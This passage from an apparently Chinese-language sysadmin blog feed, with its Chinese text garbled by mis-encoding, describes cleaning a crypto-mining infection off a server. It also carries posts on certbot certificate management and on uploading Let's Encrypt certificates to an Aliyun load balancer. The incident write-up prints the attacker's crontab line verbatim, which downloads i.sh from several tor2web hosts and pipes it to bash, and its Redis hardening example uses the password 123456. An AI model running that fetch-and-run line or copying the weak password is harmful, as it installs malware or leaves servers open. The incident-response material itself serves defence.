class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo lsof -p 27493</span><br><span class="line">COMMAND   PID USER   FD   TYPE     DEVICE SIZE/OFF       NODE NAME</span><br><span class="line">ZXGcBt  27493 root  cwd    DIR      253,1     4096          2 /</span><br><span class="line">ZXGcBt  27493 root  rtd    DIR      253,1     4096          2 /</span><br><span class="line">ZXGcBt  27493 root  txt    REG      253,1   198140     924524 /root/.x (deleted)</span><br><span class="line">ZXGcBt  27493 root    0r  FIFO        0,8      0t0 1782547852 pipe</span><br><span class="line">ZXGcBt  27493 root    1w   CHR        1,3      0t0       1028 /dev/null</span><br><span class="line">ZXGcBt  27493 root    2w   CHR        1,3      0t0       1028 /dev/null</span><br><span class="line">ZXGcBt  27493 root    3w   REG      253,1        6    2494781 /tmp/.X11-lock</span><br><span class="line">ZXGcBt  27493 root    5u  IPv4 1788320222      0t0        TCP DWD-BETA:46392-&gt;37.59.44.93:http (ESTABLISHED)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¯¥è¿›ç¨‹å‘èµ·äº†ä¸€ä¸ªhttpçš„é“¾æ¥.è®¿é—®å¤–éƒ¨çš„httpæœåŠ¡å™¨</p><p>3.æŸ¥çœ‹å®é™…è¿›ç¨‹çš„ç¬¦å·é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo ls -l /proc/27493/exe</span><br><span class="line">lrwxrwxrwx 1 root root 0 Oct 20 17:46 /proc/27493/exe -&gt; /root/.x (deleted)</span><br></pre></td></tr></table></figure><p>4.æŸ¥çœ‹å®šæ—¶ä»»åŠ¡,çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç–‘çš„è‡ªåŠ¨è¿è¡Œç¨‹åº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo crontab -l</span><br><span class="line">49 * * * * (wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.io/i.sh||wget -qO- -U- http://ddgsdk6oou6znsdn.tor2web.me/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.onion.ws/i.sh)|bash</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸ªéå¸¸å¯ç–‘çš„å®šæ—¶ä»»åŠ¡.è¯¥ä»»åŠ¡ä¼šå®šæœŸä»ç½‘ä¸Šä¸‹è½½i.shè„šæœ¬.ç„¶åç”¨bashæ‰§è¡Œ</p><p>5.åˆ é™¤è¿™ä¸ªå®šæ—¶ä»»åŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo crontab -e</span><br><span class="line">crontab: installing new crontab</span><br><span class="line">crontab: error renaming /var/spool/cron/#tmp.DWD-BETA.XXXXAzSEpy to /var/spool/cron/root</span><br><span class="line">rename: Operation not permitted</span><br><span class="line">crontab: edits left in /tmp/crontab.TIdire</span><br><span class="line">[work@DWD-BETA ~]$ sudo crontab -l</span><br><span class="line">49 * * * * (wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.io/i.sh||wget -qO- -U- http://ddgsdk6oou6znsdn.tor2web.me/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.onion.ws/i.sh)|bash</span><br></pre></td></tr></table></figure><p>åœ¨crontab -eçš„å‘½ä»¤è¡Œç•Œé¢æ— æ³•åˆ é™¤.</p><p>6.å°è¯•åˆ é™¤crontabæ–‡ä»¶.ä¹Ÿæç¤ºæ²¡æœ‰æƒé™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# ls -l /var/spool/cron/root </span><br><span class="line">-rw------- 1 root root 239 Oct 20 00:01 /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# vim /var/spool/cron/root </span><br><span class="line">[root@DWD-BETA ~]# rm -rf /var/spool/cron/root</span><br><span class="line">rm: cannot remove â€˜/var/spool/cron/rootâ€™: Operation not permitted</span><br></pre></td></tr></table></figure></p><p>7.é€šè¿‡lsattrå‘ç°è¯¥æ–‡ä»¶æœ‰éšè—çš„iå±æ€§<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# lsattr /var/spool/cron/root</span><br><span class="line">----i--------e-- /var/spool/cron/root</span><br></pre></td></tr></table></figure></p><p>8.å»æ‰éšè—å±æ€§.åˆ é™¤è¯¥æ–‡ä»¶.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# chattr -i /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# lsattr /var/spool/cron/root</span><br><span class="line">-------------e-- /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# rm -rf /var/spool/cron/root</span><br><span class="line">[root@DWD-BETA ~]# ls -l /var/spool/cron/root </span><br><span class="line">ls: cannot access /var/spool/cron/root: No such file or directory</span><br></pre></td></tr></table></figure></p><blockquote><p>note:æœ€å¥½æ˜¯è¿›å…¥crontab -eç•Œé¢æ¸…ç©ºå®šæ—¶ä»»åŠ¡.è€Œä¸æ˜¯ç›´æ¥åˆ é™¤crontabæ–‡ä»¶</p></blockquote><p>9.åˆ é™¤è¯¥è¿›ç¨‹.å‘ç°è¯¥è¿›ç¨‹å·²ç»æ¶ˆå¤±..è€Œä¸”CPUä½¿ç”¨ç‡å¤§å¹…ä¸‹é™,å›åˆ°æ­£å¸¸<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep -i zxgcbt</span><br></pre></td></tr></table></figure></p><hr><h3 id="åˆ©ç”¨ansibleæ£€æŸ¥å…¶ä»–æ‰€æœ‰æœåŠ¡å™¨çš„å®šæ—¶ä»»åŠ¡-æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘è„šæœ¬"><a href="#åˆ©ç”¨ansibleæ£€æŸ¥å…¶ä»–æ‰€æœ‰æœåŠ¡å™¨çš„å®šæ—¶ä»»åŠ¡-æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘è„šæœ¬" class="headerlink" title="åˆ©ç”¨ansibleæ£€æŸ¥å…¶ä»–æ‰€æœ‰æœåŠ¡å™¨çš„å®šæ—¶ä»»åŠ¡,æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘è„šæœ¬"></a>åˆ©ç”¨ansibleæ£€æŸ¥å…¶ä»–æ‰€æœ‰æœåŠ¡å™¨çš„å®šæ—¶ä»»åŠ¡,æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘è„šæœ¬</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ansible allserver -m shell -a  &apos;crontab -l&apos;</span><br><span class="line">ansible allserver -m shell -a  &quot;su - work -c &apos;crontab -l&apos;&quot;</span><br></pre></td></tr></table></figure><hr><p>ç½‘ä¸Šæœäº†ä¸€ä¸‹æˆ‘çš„æ¡ˆä¾‹,å‘ç°å¾ˆå¤šäººå’Œæˆ‘æœ‰åŒæ ·çš„ç»å†,å¹¶ä¸”éƒ½æ˜¯é€šè¿‡redisçš„æ¼æ´å–å¾—æƒé™.</p><h3 id="åŠ å›ºredisçš„å®‰å…¨æ€§"><a href="#åŠ å›ºredisçš„å®‰å…¨æ€§" class="headerlink" title="åŠ å›ºredisçš„å®‰å…¨æ€§"></a>åŠ å›ºredisçš„å®‰å…¨æ€§</h3><p>1.ä¿®æ”¹ä¾¦å¬åœ°å€.æœ€å¥½ä¸è¦ä¾¦å¬å¤–ç½‘æ¥å£<br>2.ç»™redisè®¾ç½®å¯†ç <br>3.ä¿®æ”¹é»˜è®¤ä¾¦å¬ç«¯å£</p><p>ç¼–è¾‘redis.cnfé…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ sudo vim /etc/redis.conf</span><br><span class="line">#ä¿®æ”¹ä¾¦å¬åœ°å€ä¸º127.0.0.1.åªå…è®¸æœ¬æœºè®¿é—®</span><br><span class="line">bind 127.0.0.1</span><br><span class="line"></span><br><span class="line">#è®¾ç½®ä¸€ä¸ªå¯†ç .å¯†ç ä¸º123456</span><br><span class="line">requirepass 123456</span><br></pre></td></tr></table></figure><p>é‡å¯redisè¿›ç¨‹.</p><p>æ­¤æ—¶å°±éœ€è¦å…ˆéªŒè¯å¯†ç :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA ~]$ redis-cli</span><br><span class="line">127.0.0.1:6379&gt; select 0</span><br><span class="line">(error) NOAUTH Authentication required.</span><br><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹&quot;&gt;&lt;a href=&quot;#BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹&quot; class=&quot;headerlink&quot; title=&quot;BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹&quot;&gt;&lt;/a&gt;BETAæœåŠ¡å™¨ä¸­æ¯’æ¡ˆä¾‹&lt;/h2&gt;&lt;p&gt;å‘¨æœ«å‘ç°å…¬å¸çš„BETAæœåŠ¡å™¨å ç”¨CPUéå¸¸éå¸¸é«˜.åˆ©ç”¨htopæŸ¥çœ‹å‘ç°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„è¿›ç¨‹å:ZXGcBt&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ç›´è§‰å°±æ˜¯æœåŠ¡å™¨å¯èƒ½é­å—äº†æ”»å‡»,è¢«æ¤å…¥äº†å¯ç–‘ç¨‹åº.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;è§£å†³æ­¥éª¤&quot;&gt;&lt;a href=&quot;#è§£å†³æ­¥éª¤&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³æ­¥éª¤:&quot;&gt;&lt;/a&gt;è§£å†³æ­¥éª¤:&lt;/h3&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
    
      <category term="redis" scheme="https://jesse.top/tags/redis/"/>
    
      <category term="æŒ–çŸ¿" scheme="https://jesse.top/tags/%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>Certbotç®¡ç†Lets Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ</title>
    <link href="https://jesse.top/2018/10/15/Linux-Basic/SSL/Certbot%E7%AE%A1%E7%90%86Lets%20Encrypt%E8%AF%81%E4%B9%A6%E7%9A%84%E5%87%A0%E4%B8%AA%E7%BB%8F%E9%AA%8C/"/>
    <id>https://jesse.top/2018/10/15/Linux-Basic/SSL/Certbotç®¡ç†Lets Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ/</id>
    <published>2018-10-15T09:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Certbotç®¡ç†Lets-Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ"><a href="#Certbotç®¡ç†Lets-Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ" class="headerlink" title="Certbotç®¡ç†Lets Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ"></a>Certbotç®¡ç†Lets Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ</h2><p>certbotæä¾›äº†å¾ˆå¤šå‘½ä»¤å’Œæ’ä»¶ç”³è¯·,æ³¨é”€,ç»­çº¦letsencryptçš„è¯ä¹¦.ä½¿ç”¨éå¸¸æ–¹ä¾¿.å€Ÿé‰´ç½‘ä¸Šçš„ä¸€äº›å°æŠ€å·§,æ•´ç†å‡ºäº†è¿™ç¯‡æ–‡ç« .</p><p>åç»­å¦‚æœæœ‰æ›´å¤šæ•™è®­æˆ–è€…ç»éªŒæŠ€å·§,è¿˜ä¼šæ›´æ–°æ­¤ç¯‡æ–‡ç« .</p><a id="more"></a><p>â€“</p><h3 id="1-è®¾ç½®é‚®ç®±æ¥æ”¶è¯ä¹¦è¿‡æœŸçš„é€šçŸ¥"><a href="#1-è®¾ç½®é‚®ç®±æ¥æ”¶è¯ä¹¦è¿‡æœŸçš„é€šçŸ¥" class="headerlink" title="1.è®¾ç½®é‚®ç®±æ¥æ”¶è¯ä¹¦è¿‡æœŸçš„é€šçŸ¥"></a>1.è®¾ç½®é‚®ç®±æ¥æ”¶è¯ä¹¦è¿‡æœŸçš„é€šçŸ¥</h3><p>ä¸€å¼ Letâ€™s Encrypt è¯ä¹¦æœ‰æ•ˆæœŸæ˜¯ 90 å¤©ï¼Œæœ‰æ•ˆæœŸå¤ªçŸ­ï¼ŒLetâ€™s Encrypt ä¼šåœ¨è¯ä¹¦å¿«è¿‡æœŸçš„æ—¶å€™ï¼Œç»™ emailåœ°å€å‘é€è¯ä¹¦å¿«è¿‡æœŸçš„é€šçŸ¥ã€‚é€šè¿‡ä¸‹åˆ—å‘½ä»¤è®¾ç½®æˆ–è€…ä¿®æ”¹ä¸€ä¸ªemailåœ°å€:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ certbot-auto register --update-registration --email admin@example.com</span><br></pre></td></tr></table></figure><p>â€“</p><h3 id="2-å®‰è£…certbot-auto"><a href="#2-å®‰è£…certbot-auto" class="headerlink" title="2.å®‰è£…certbot-auto"></a>2.å®‰è£…certbot-auto</h3><p>certbot å’Œ certbot-auto æœ¬è´¨ä¸Šæ²¡æœ‰åŒºåˆ«ï¼Œå®‰è£…certbot-autoä¹Ÿéå¸¸ç®€å•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://dl.eff.org/certbot-auto</span><br><span class="line">$ chmod a+x ./certbot-auto</span><br></pre></td></tr></table></figure><p>è€Œå¦‚æœæ˜¯é€šè¿‡apt-get,yumç­‰å®‰è£…æ–¹å¼çš„è¯.å®‰è£…çš„å°±æ˜¯certbotå·¥å…·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install certbot</span><br></pre></td></tr></table></figure><p>â€“</p><h3 id="3-æŸ¥çœ‹ç”³è¯·äº†å“ªäº›è¯ä¹¦"><a href="#3-æŸ¥çœ‹ç”³è¯·äº†å“ªäº›è¯ä¹¦" class="headerlink" title="3.æŸ¥çœ‹ç”³è¯·äº†å“ªäº›è¯ä¹¦"></a>3.æŸ¥çœ‹ç”³è¯·äº†å“ªäº›è¯ä¹¦</h3><p>é€šè¿‡ä¸‹åˆ—å‘½ä»¤å¯ä»¥æŸ¥çœ‹ç›®å‰æœåŠ¡å™¨ä¸Šç”³è¯·è¿‡çš„è¯ä¹¦,ä»¥åŠè¯ä¹¦æ‰€åœ¨è·¯å¾„,è¯ä¹¦æœ‰æ•ˆæœŸç­‰ä¿¡æ¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# certbot certificates</span><br><span class="line"></span><br><span class="line">Found the following certs:</span><br><span class="line">  Certificate Name: topic.dev.doweidu.com</span><br><span class="line">    Domains: topic.dev.doweidu.com</span><br><span class="line">    Expiry Date: 2019-01-09 08:22:20+00:00 (VALID: 85 days)</span><br><span class="line">    Certificate Path: /etc/letsencrypt/live/topic.dev.doweidu.com/fullchain.pem</span><br><span class="line">    Private Key Path: /etc/letsencrypt/live/topic.dev.doweidu.com/privkey.pem</span><br></pre></td></tr></table></figure><p>â€“</p><h3 id="3-æ³¨é”€è¯ä¹¦"><a href="#3-æ³¨é”€è¯ä¹¦" class="headerlink" title="3.æ³¨é”€è¯ä¹¦"></a>3.æ³¨é”€è¯ä¹¦</h3><p>å¦‚æœåŸŸåè¯ä¹¦ä¸éœ€è¦çš„è¯,å¯ä»¥å°†è¯ä¹¦æ³¨é”€æ‰,ä½†æ˜¯æœ€å¥½ä¸è¦ä½¿ç”¨rmç›´æ¥åˆ é™¤è¯ä¹¦æ–‡ä»¶.æœ€å¥½æ˜¯ç”¨revokeé€‰é¡¹é€šçŸ¥LetsEncryptæ³¨é”€è¯ä¹¦.</p><p>æ³¨é”€è¯ä¹¦å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@1264f80bcd97:~# ./certbot-auto revoke --cert-path /etc/letsencrypt/live/deploy.haoshiqi.net/cert.pem  --reason superseded</span><br></pre></td></tr></table></figure><p>â€“cert-pathè¡¨ç¤ºè¯ä¹¦æ–‡ä»¶æ‰€åœ¨è·¯å¾„<br>â€“reasonè¡¨ç¤ºæ³¨é”€åŸå› .supersededè¡¨ç¤ºä½œåºŸçš„æ„æ€</p><p>è¾“å‡ºå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@1264f80bcd97:~# ./certbot-auto revoke --cert-path /etc/letsencrypt/live/deploy.haoshiqi.net/cert.pem  --reason superseded</span><br><span class="line">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Would you like to delete the cert(s) you just revoked?</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es (recommended)/(N)o: y</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Deleted all files relating to certificate deploy.haoshiqi.net.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Congratulations! You have successfully revoked the certificate that was located</span><br><span class="line">at /etc/letsencrypt/live/deploy.haoshiqi.net/cert.pem</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Certbotç®¡ç†Lets-Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ&quot;&gt;&lt;a href=&quot;#Certbotç®¡ç†Lets-Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ&quot; class=&quot;headerlink&quot; title=&quot;Certbotç®¡ç†Lets Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ&quot;&gt;&lt;/a&gt;Certbotç®¡ç†Lets Encryptè¯ä¹¦çš„å‡ ä¸ªç»éªŒ&lt;/h2&gt;&lt;p&gt;certbotæä¾›äº†å¾ˆå¤šå‘½ä»¤å’Œæ’ä»¶ç”³è¯·,æ³¨é”€,ç»­çº¦letsencryptçš„è¯ä¹¦.ä½¿ç”¨éå¸¸æ–¹ä¾¿.å€Ÿé‰´ç½‘ä¸Šçš„ä¸€äº›å°æŠ€å·§,æ•´ç†å‡ºäº†è¿™ç¯‡æ–‡ç« .&lt;/p&gt;
&lt;p&gt;åç»­å¦‚æœæœ‰æ›´å¤šæ•™è®­æˆ–è€…ç»éªŒæŠ€å·§,è¿˜ä¼šæ›´æ–°æ­¤ç¯‡æ–‡ç« .&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="SSL" scheme="https://jesse.top/categories/Linux-Basic/SSL/"/>
    
    
      <category term="SSL" scheme="https://jesse.top/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡</title>
    <link href="https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencrypt%E8%AF%81%E4%B9%A6%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91SLB/"/>
    <id>https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLB/</id>
    <published>2018-10-15T03:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡"><a href="#letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡" class="headerlink" title="letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡"></a>letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æœ€è¿‘åœ¨é˜¿é‡Œäº‘å¼€é€šäº†ä¸€ä¸ªSLBè´Ÿè½½å‡è¡¡å®ä¾‹,ç„¶åæŠŠECSä¸Šç”³è¯·çš„å…è´¹çš„letsencryptè¯ä¹¦ä¸Šä¼ åˆ°SLBä¸‹.</p><p>æŒ‰ç…§ç®€ä¹¦ä¸Šçš„è¿™ä¸ªæµç¨‹: <a href="https://www.jianshu.com/p/b1814f200fef" target="_blank" rel="noopener">letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLB</a></p><p>ä½†æ˜¯å‡ºç°äº†ä¸€ä¸ªå¥‡æ€ªçš„ç°è±¡.æµè§ˆå™¨,PC,IOSç­‰è®¾å¤‡Httpsè®¿é—®å‡æ­£å¸¸,ä½†æ˜¯æ‰€æœ‰çš„å®‰å“è®¾å¤‡å¾®ä¿¡æ‰«ç å°ç¨‹åºç™»é™†å´æç¤ºè¯ä¹¦é”™è¯¯:<strong>err:request:fail ssl hand shake error</strong></p><a id="more"></a><hr><h3 id="SSLè¯Šæ–­"><a href="#SSLè¯Šæ–­" class="headerlink" title="SSLè¯Šæ–­"></a>SSLè¯Šæ–­</h3><p>ä½¿ç”¨SSLåœ¨çº¿è¯Šæ–­å·¥å…·<a href="http://aq.chinaz.com/" target="_blank" rel="noopener">SSLæ£€æµ‹</a> .å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯è¯ä¹¦å­˜åœ¨ä¸€äº›é—®é¢˜.åœ¨ç½‘ä¸Šbaiduå’Œgoogleæœå¯»ä¹Ÿæ²¡æœ‰å¤ªå¤šå¯ç”¨çš„èµ„æ–™.</p><p>ä½†æ˜¯æˆ‘å°†è¯¥åŸŸåè§£æåˆ°ECSæœ¬åœ°(SLBä¸Šçš„letsencryptè¯ä¹¦å°±æ˜¯è¯¥ECSä¸Šç”³è¯·çš„).å†æ¬¡åˆ©ç”¨SSLåœ¨çº¿è¯Šæ–­å·¥å…·,å‘ç°è¯ä¹¦ä¸€åˆ‡æ­£å¸¸.å®‰å“è®¿é—®è¯¥åŸŸåä¹Ÿæ²¡æœ‰é—®é¢˜.</p><p>äºæ˜¯,åˆæ­¥åˆ¤æ–­æ˜¯è¯ä¹¦ä¸Šä¼ åˆ°SLBåå‡ºç°çš„é—®é¢˜.</p><hr><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>æ ¹æ®é˜¿é‡Œäº‘çš„æ–‡æ¡£<a href="https://help.aliyun.com/document_detail/32332.html" target="_blank" rel="noopener">SSLè¦æ±‚</a>.letsencryptæ˜¯ä¸­çº§è¯ä¹¦é¢å‘æœºæ„,ç”³è¯·ä¸‹æ¥çš„è¯ä¹¦åŒ…å«äº†å¤šä¸ªè¯ä¹¦æ–‡ä»¶.å…¶ä¸­åŒ…å«ä»¥ä¸‹ä¸»è¦çš„4ä¸ªæ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA m.betaapi.haoshiqi.net]# ls</span><br><span class="line">cert.pem  chain.pem  fullchain.pem  privkey.pem  README</span><br></pre></td></tr></table></figure><p>cert.pem                #æœåŠ¡å™¨è¯ä¹¦</p><p>chain.pem          #æµè§ˆå™¨éœ€è¦çš„æ‰€æœ‰è¯ä¹¦ä½†ä¸åŒ…æ‹¬æœåŠ¡ç«¯è¯ä¹¦ï¼Œæ¯”å¦‚æ ¹è¯ä¹¦å’Œä¸­é—´è¯ä¹¦</p><p>fullchain.pem     #ä¸­çº§è¯ä¹¦,åŒ…æ‹¬äº†cert.pemå’Œchain.pemçš„å†…å®¹</p><p>privkey.pem        #æœåŠ¡å™¨è¯ä¹¦ç§é’¥</p><p>ç”±äºåˆšæ‰åªå°†cert.pemæœåŠ¡å™¨è¯ä¹¦å’Œprivkey.pemæœåŠ¡å™¨è¯ä¹¦ç§é’¥æ–‡ä»¶ä¸Šä¼ åˆ°SLB.æ‰€ä»¥å‡ºç°è¯ä¹¦é”™è¯¯çš„å¼‚å¸¸æƒ…å†µ.</p><hr><h3 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h3><p>æ ¹æ®ä¸Šé¢é˜¿é‡Œäº‘çš„æ–‡æ¡£,åœ¨é˜¿é‡Œäº‘SLBä¸Šåˆ›å»ºè¯ä¹¦æ—¶,å°†cert.pemè¯ä¹¦å’Œfullchain.pemè¯ä¹¦å†…å®¹å¤åˆ¶åˆ°â€å…¬é’¥è¯ä¹¦â€æ ä¸­.</p><p>æ³¨æ„:æœåŠ¡å™¨è¯ä¹¦(cert.pem)æ”¾ç¬¬ä¸€ä½ï¼Œä¸­çº§è¯ä¹¦(fullchain.pem)æ”¾ç¬¬äºŒä½ï¼Œä¸­é—´ä¸èƒ½æœ‰ç©ºè¡Œã€‚</p><p>æ¥ä¸‹æ¥å°†privkey.pemç§é’¥è¯ä¹¦æ”¾åœ¨â€ç§é’¥â€ä¸€æ ä¸­.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡&quot;&gt;&lt;a href=&quot;#letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡&quot; class=&quot;headerlink&quot; title=&quot;letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡&quot;&gt;&lt;/a&gt;letsencryptè¯ä¹¦ä¸Šä¼ åˆ°é˜¿é‡Œäº‘SLBè´Ÿè½½å‡è¡¡&lt;/h2&gt;&lt;h3 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h3&gt;&lt;p&gt;æœ€è¿‘åœ¨é˜¿é‡Œäº‘å¼€é€šäº†ä¸€ä¸ªSLBè´Ÿè½½å‡è¡¡å®ä¾‹,ç„¶åæŠŠECSä¸Šç”³è¯·çš„å…è´¹çš„letsencryptè¯ä¹¦ä¸Šä¼ åˆ°SLBä¸‹.&lt;/p&gt;
